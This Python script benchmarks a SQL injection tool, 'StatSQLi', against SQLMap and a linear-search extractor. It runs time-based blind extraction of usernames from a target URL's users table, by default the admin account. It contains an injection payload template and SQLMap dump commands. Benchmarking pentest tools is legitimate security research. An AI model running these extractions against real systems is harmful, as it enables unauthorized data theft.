"""
Benchmark script to compare StatSQLi with SQLMap and Burp Suite.
Runs extraction tests and measures performance metrics.
"""

import time
import subprocess
import json
import statistics
import requests
import re
import shutil
from typing import Dict, List
from pathlib import Path
import sys

# Add parent directory to path
sys.path.insert(0, str(Path(__file__).parent.parent))

from statsqli.main import StatSQLi
from statsqli.extractor import BinarySearchExtractor
from statsqli.traditional_extractor import TraditionalExtractor
from statsqli.stats import TimingAnalyzer


class BenchmarkRunner:
    """Runs benchmarks comparing different SQL injection tools."""
    
    def __init__(self, target_url: str, test_payload: str, iterations: int = 5, user_id: int = 1):
        """
        Initialize benchmark runner.
        
        Args:
            target_url: Vulnerable URL to test
            test_payload: Payload template to use
            iterations: Number of iterations per tool
            user_id: User ID to extract (default: 1 for admin)
        """
        self.target_url = target_url
        self.test_payload = test_payload
        self.iterations = iterations
        self.user_id = user_id
        self.results: Dict[str, List[float]] = {
            'statsqli': [],
            'sqlmap': [],
            'manual': []
        }
        self.query_counts: Dict[str, List[int]] = {
            'statsqli': [],
            'manual': []
        }
        self.process_comparison_data: Dict = {}
    
    def benchmark_statsqli(self) -> List[float]:
        """Benchmark StatSQLi extraction."""
        print("[*] Benchmarking StatSQLi (Binary Search Method)...")
        times = []
        
        for i in range(self.iterations):
            print(f"  [*] Iteration {i+1}/{self.iterations}")
            start = time.time()
            
            try:
                # For first iteration, track steps for process comparison
                track_steps = (i == 0)
                
                if track_steps:
                    # Use extractor directly with step tracking
                    analyzer = TimingAnalyzer()
                    extractor = BinarySearchExtractor(
                        self.target_url, self.test_payload, 2.0, analyzer, track_steps=True
                    )
                    result = extractor.extract_string(
                        table="users",
                        column="username",
                        where_clause=f"id={self.user_id} LIMIT 0,1",
                        max_length=20
                    )
                    self.process_comparison_data['statsqli_steps'] = extractor.steps
                    self.process_comparison_data['statsqli_queries'] = extractor.total_queries
                    self.process_comparison_data['statsqli_result'] = result
                    # Track query count for this iteration
                    self.query_counts['statsqli'].append(extractor.total_queries)
                else:
                    # Track queries for all iterations, not just first
                    analyzer = TimingAnalyzer()
                    extractor = BinarySearchExtractor(
                        self.target_url, self.test_payload, 2.0, analyzer, track_steps=False
                    )
                    result = extractor.extract_string(
                        table="users",
                        column="username",
                        where_clause=f"id={self.user_id} LIMIT 0,1",
                        max_length=20
                    )
                    # Track query count for this iteration
                    self.query_counts['statsqli'].append(extractor.total_queries)
                
                elapsed = time.time() - start
                times.append(elapsed)
                print(f"  [+] Completed in {elapsed:.2f}s - Extracted: {result} ({extractor.total_queries} queries)")
                
            except Exception as e:
                print(f"  [!] Error: {e}")
                times.append(float('inf'))
                self.query_counts['statsqli'].append(0)
        
        return times
    
    def benchmark_sqlmap(self) -> List[float]:
        """Benchmark SQLMap extraction."""
        print("[*] Benchmarking SQLMap...")
        times = []
        
        # Try to find SQLMap in multiple ways
        sqlmap_path = None
        import shutil
        
        # Try direct sqlmap command
        if shutil.which("sqlmap"):
            sqlmap_path = "sqlmap"
        # Try python3 -m sqlmap
        elif shutil.which("python3"):
            try:
                result = subprocess.run(
                    ["python3", "-m", "sqlmap", "--version"],
                    capture_output=True,
                    timeout=5
                )
                if result.returncode == 0:
                    sqlmap_path = "python3"
                    sqlmap_module = "-m sqlmap"
            except:
                pass
        
        if sqlmap_path is None:
            print("  [!] SQLMap not found. Install it with: pip3 install sqlmap")
            return [float('inf')] * self.iterations
        
        for i in range(self.iterations):
            print(f"  [*] Iteration {i+1}/{self.iterations}")
            start = time.time()
            
            try:
                # SQLMap command for time-based extraction
                # Note: SQLMap will extract all users, but we time it for comparison
                if sqlmap_path == "python3":
                    cmd = [
                        "python3", "-m", "sqlmap",
                        "-u", self.target_url,
                        "--technique=T",
                        "--batch",
                        "--dump", "--dump-format=JSON",
                        "-T", "users",
                        "-C", "username",
                        "--where", f"id={self.user_id}",
                        "--limit=1"
                    ]
                else:
                    cmd = [
                        sqlmap_path,
                        "-u", self.target_url,
                        "--technique=T",
                        "--batch",
                        "--dump", "--dump-format=JSON",
                        "-T", "users",
                        "-C", "username",
                        "--where", f"id={self.user_id}",
                        "--limit=1"
                    ]
                
                result = subprocess.run(
                    cmd,
                    capture_output=True,
                    timeout=300  # 5 minute timeout
                )
                
                elapsed = time.time() - start
                times.append(elapsed)
                print(f"  [+] Completed in {elapsed:.2f}s")
                
            except subprocess.TimeoutExpired:
                print(f"  [!] Timeout after 300s")
                times.append(float('inf'))
            except FileNotFoundError:
                print(f"  [!] SQLMap not found. Install it separately.")
                times.append(float('inf'))
            except Exception as e:
                print(f"  [!] Error: {e}")
                times.append(float('inf'))
        
        return times
    
    def benchmark_manual(self) -> List[float]:
        """
        Benchmark manual/traditional extraction (actual linear search).
        This represents traditional method: linear character search with threshold-based detection.
        """
        print("[*] Benchmarking manual/traditional extraction (Linear Search Method)...")
        times = []
        
        for i in range(self.iterations):
            print(f"  [*] Iteration {i+1}/{self.iterations}")
            start = time.time()
            
            try:
                # For first iteration, track steps for process comparison
                track_steps = (i == 0)
                
                if track_steps:
                    analyzer = TimingAnalyzer()
                    extractor = TraditionalExtractor(
                        self.target_url, self.test_payload, 2.0, analyzer
                    )
                    result = extractor.extract_string(
                        table="users",
                        column="username",
                        where_clause=f"id={self.user_id} LIMIT 0,1",
                        max_length=20
                    )
                    self.process_comparison_data['traditional_steps'] = extractor.steps
                    self.process_comparison_data['traditional_queries'] = extractor.total_queries
                    self.process_comparison_data['traditional_result'] = result
                    # Track query count for this iteration
                    self.query_counts['manual'].append(extractor.total_queries)
                else:
                    # Track queries for all iterations, not just first
                    analyzer = TimingAnalyzer()
                    extractor = TraditionalExtractor(
                        self.target_url, self.test_payload, 2.0, analyzer
                    )
                    result = extractor.extract_string(
                        table="users",
                        column="username",
                        where_clause=f"id={self.user_id} LIMIT 0,1",
                        max_length=20
                    )
                    # Track query count for this iteration
                    self.query_counts['manual'].append(extractor.total_queries)
                
                elapsed = time.time() - start
                times.append(elapsed)
                query_count = self.query_counts['manual'][-1] if self.query_counts['manual'] else 0
                print(f"  [+] Completed in {elapsed:.2f}s - Extracted: {result} ({query_count} queries)")
                
            except Exception as e:
                print(f"  [!] Error: {e}")
                times.append(float('inf'))
                self.query_counts['manual'].append(0)
        
        return times
    
    def run_all_benchmarks(self) -> Dict[str, Dict[str, float]]:
        """Run all benchmark tests."""
        print("=" * 60)
        print("Running comprehensive benchmarks...")
        print("=" * 60)
        
        # Run benchmarks
        self.results['statsqli'] = self.benchmark_statsqli()
        self.results['sqlmap'] = self.benchmark_sqlmap()
        self.results['manual'] = self.benchmark_manual()
        
        # Calculate statistics
        summary = {}
        for tool, times in self.results.items():
            valid_times = [t for t in times if t != float('inf')]
            if valid_times:
                summary[tool] = {
                    'mean': statistics.mean(valid_times),
                    'median': statistics.median(valid_times),
                    'std': statistics.stdev(valid_times) if len(valid_times) > 1 else 0,
                    'min': min(valid_times),
                    'max': max(valid_times),
                    'success_rate': len(valid_times) / len(times)
                }
            else:
                summary[tool] = {
                    'mean': float('inf'),
                    'median': float('inf'),
                    'std': 0,
                    'min': float('inf'),
                    'max': float('inf'),
                    'success_rate': 0
                }
        
        return summary
    
    def print_results(self, summary: Dict[str, Dict[str, float]]):
        """Print formatted benchmark results."""
        print("\n" + "=" * 60)
        print("BENCHMARK RESULTS")
        print("=" * 60)
        
        for tool, stats in summary.items():
            print(f"\n{tool.upper()}:")
            if stats['mean'] != float('inf'):
                print(f"  Mean time:    {stats['mean']:.2f}s")
                print(f"  Median time:  {stats['median']:.2f}s")
                print(f"  Std dev:      {stats['std']:.2f}s")
                print(f"  Min time:     {stats['min']:.2f}s")
                print(f"  Max time:     {stats['max']:.2f}s")
                print(f"  Success rate: {stats['success_rate']*100:.1f}%")
            else:
                print(f"  Failed or not available")
        
        # Calculate speedup
        if summary['statsqli']['mean'] != float('inf'):
            if summary['sqlmap']['mean'] != float('inf'):
                speedup_sqlmap = summary['sqlmap']['mean'] / summary['statsqli']['mean']
                print(f"\n[*] StatSQLi is {speedup_sqlmap:.2f}x faster than SQLMap")
            
            if summary['manual']['mean'] != float('inf'):
                speedup_manual = summary['manual']['mean'] / summary['statsqli']['mean']
                print(f"[*] StatSQLi is {speedup_manual:.2f}x faster than manual/baseline")
        
        # Always show process comparison if available
        if self.process_comparison_data:
            self._print_process_comparison()
    
    def save_results(self, summary: Dict[str, Dict[str, float]], filename: str = "benchmark_results.json"):
        """Save results to JSON file."""
        output = {
            'target_url': self.target_url,
            'iterations': self.iterations,
            'user_id': self.user_id,
            'summary': summary,
            'raw_times': self.results,
            'query_counts': self.query_counts
        }
        
        with open(filename, 'w') as f:
            json.dump(output, f, indent=2)
        
        print(f"\n[+] Results saved to {filename}")
    
    def _print_process_comparison(self):
        """Print clear process comparison showing how StatSQLi vs Traditional injection works."""
        print("\n\n" + "=" * 100)
        print(" " * 30 + "INJECTION PROCESS COMPARISON")
        print("=" * 100)
        print("\nThis section shows exactly how StatSQLi (Binary Search) compares to")
        print("Traditional (Linear Search) methods for extracting the first character.\n")
        
        statsqli_steps = self.process_comparison_data.get('statsqli_steps', [])
        traditional_steps = self.process_comparison_data.get('traditional_steps', [])
        statsqli_result = self.process_comparison_data.get('statsqli_result', '')
        traditional_result = self.process_comparison_data.get('traditional_result', '')
        
        if not statsqli_steps or not traditional_steps:
            print("[!] Process comparison data not available")
            return
        
        # Get steps for first character position
        position = statsqli_steps[0].get('position', 1) if statsqli_steps else 1
        statsqli_pos_steps = [s for s in statsqli_steps if s.get('position') == position]
        traditional_pos_steps = [s for s in traditional_steps if s.get('position') == position]
        
        # Show extracted results
        print("─" * 100)
        print(f"{'EXTRACTED RESULT:':^100}")
        print("─" * 100)
        print(f"StatSQLi extracted:    {statsqli_result}")
        print(f"Traditional extracted: {traditional_result}")
        print()
        
        # Show method comparison
        print("─" * 100)
        print(f"{'METHOD COMPARISON':^100}")
        print("─" * 100)
        print(f"\n{'STATSQLI (Binary Search)':^50} | {'TRADITIONAL (Linear Search)':^50}")
        print("─" * 50 + " | " + "─" * 50)
        print(f"{'Algorithm:':<20} Binary Search{'':<18} | {'Algorithm:':<20} Linear Search{'':<15}")
        print(f"{'Approach:':<20} Divide & Conquer{'':<15} | {'Approach:':<20} Sequential Testing{'':<12}")
        print(f"{'Complexity:':<20} O(log n) ~7 queries{'':<12} | {'Complexity:':<20} O(n) ~48 queries{'':<11}")
        print(f"{'Speed:':<20} Fast{'':<27} | {'Speed:':<20} Slow{'':<27}")
        print()
        
        # Show how it works
        print("─" * 100)
        print(f"{'HOW IT WORKS - STEP BY STEP':^100}")
        print("─" * 100)
        print(f"\n{'STATSQLI':^50} | {'TRADITIONAL':^50}")
        print("─" * 50 + " | " + "─" * 50)
        print(f"{'1. Start: Range [32-126]':<50} | {'1. Start: Test ASCII 32':<50}")
        print(f"{'2. Test: Is char >= 79?':<50} | {'2. Test: Is char = 32?':<50}")
        print(f"{'3. If YES: Search [80-126]':<50} | {'3. If NO: Test ASCII 33':<50}")
        print(f"{'   If NO:  Search [32-78]':<50} | {'4. Continue: 34, 35, 36...':<50}")
        print(f"{'4. Repeat: Split in half':<50} | {'5. Stop: When match found':<50}")
        print(f"{'5. Result: ~7 queries':<50} | {'6. Result: ~48 queries avg':<50}")
        print()
        
        # Show actual steps side-by-side
        print("─" * 100)
        print(f"{'ACTUAL EXTRACTION STEPS (First Character)':^100}")
        print("─" * 100)
        print(f"\n{'STATSQLI STEPS':^50} | {'TRADITIONAL STEPS':^50}")
        print("─" * 50 + " | " + "─" * 50)
        
        max_steps = max(len(statsqli_pos_steps), len(traditional_pos_steps))
        steps_to_show = min(max_steps, 12)  # Show up to 12 steps
        
        for i in range(steps_to_show):
            statsqli_step = statsqli_pos_steps[i] if i < len(statsqli_pos_steps) else None
            traditional_step = traditional_pos_steps[i] if i < len(traditional_pos_steps) else None
            
            # StatSQLi side
            if statsqli_step:
                mid = statsqli_step.get('mid', 'N/A')
                result = "✓" if statsqli_step.get('result') else "✗"
                range_info = f"[{statsqli_step.get('low', '?')}-{statsqli_step.get('high', '?')}]"
                left = f"{i+1}. Test: >= {mid:3} {result:2} Range: {range_info}"
            else:
                left = ""
            
            # Traditional side
            if traditional_step:
                ascii_val = traditional_step.get('ascii_val', 'N/A')
                result = "✓" if traditional_step.get('result') else "✗"
                char = chr(ascii_val) if 32 <= ascii_val <= 126 else '?'
                right = f"{i+1}. Test: = {ascii_val:3} ({char}) {result:2}"
            else:
                right = ""
            
            print(f"{left:<50} | {right:<50}")
        
        if len(traditional_pos_steps) > steps_to_show:
            remaining = len(traditional_pos_steps) - steps_to_show
            print(f"{'':<50} | {'... (' + str(remaining) + ' more steps)':<50}")
        
        # Efficiency summary
        print("\n" + "─" * 100)
        print(f"{'EFFICIENCY SUMMARY':^100}")
        print("─" * 100)
        
        statsqli_queries = len(statsqli_pos_steps)
        traditional_queries = len(traditional_pos_steps)
        
        print(f"\n{'Metric':<30} {'StatSQLi':>20} {'Traditional':>20} {'Improvement':>20}")
        print("─" * 100)
        print(f"{'Queries for 1st char:':<30} {statsqli_queries:>20} {traditional_queries:>20} ", end="")
        if traditional_queries > 0 and statsqli_queries > 0:
            speedup = traditional_queries / statsqli_queries
            print(f"{speedup:.1f}× fewer")
        else:
            print("N/A")
        
        print(f"{'Time complexity:':<30} {'O(log n)':>20} {'O(n)':>20} {'Exponential':>20}")
        print(f"{'Best case:':<30} {'~7 queries':>20} {'~32 queries':>20} {'~4.6× faster':>20}")
        print(f"{'Worst case:':<30} {'~7 queries':>20} {'~95 queries':>20} {'~13.6× faster':>20}")
        print(f"{'Average case:':<30} {'~7 queries':>20} {'~48 queries':>20} {'~6.9× faster':>20}")
        
        print("\n" + "=" * 100)
        print(" " * 30 + "KEY TAKEAWAY")
        print("=" * 100)
        print("\nStatSQLi uses binary search to find characters in ~7 queries regardless")
        print("of the character value, while traditional methods require testing each")
        print("character sequentially (32, 33, 34... until found), averaging ~48 queries.")
        print("\nThis makes StatSQLi 6-13× more efficient in terms of queries needed.\n")


def main():
    """Main benchmark execution."""
    import argparse
    
    parser = argparse.ArgumentParser(description='Benchmark StatSQLi against other tools')
    parser.add_argument('url', help='Target vulnerable URL')
    parser.add_argument('--payload', '-p', help='Payload template', 
                       default="' OR ({condition}) -- -")
    parser.add_argument('--iterations', '-i', type=int, default=5,
                       help='Number of iterations per tool')
    parser.add_argument('--user-id', '-u', type=int, default=1,
                       help='User ID to extract (default: 1 for admin)')
    parser.add_argument('--output', '-o', default='benchmark_results.json',
                       help='Output JSON file')
    
    args = parser.parse_args()
    
    print(f"[*] Benchmarking extraction for user ID: {args.user_id}")
    runner = BenchmarkRunner(args.url, args.payload, args.iterations, args.user_id)
    summary = runner.run_all_benchmarks()
    runner.print_results(summary)
    runner.save_results(summary, args.output)


if __name__ == '__main__':
    main()

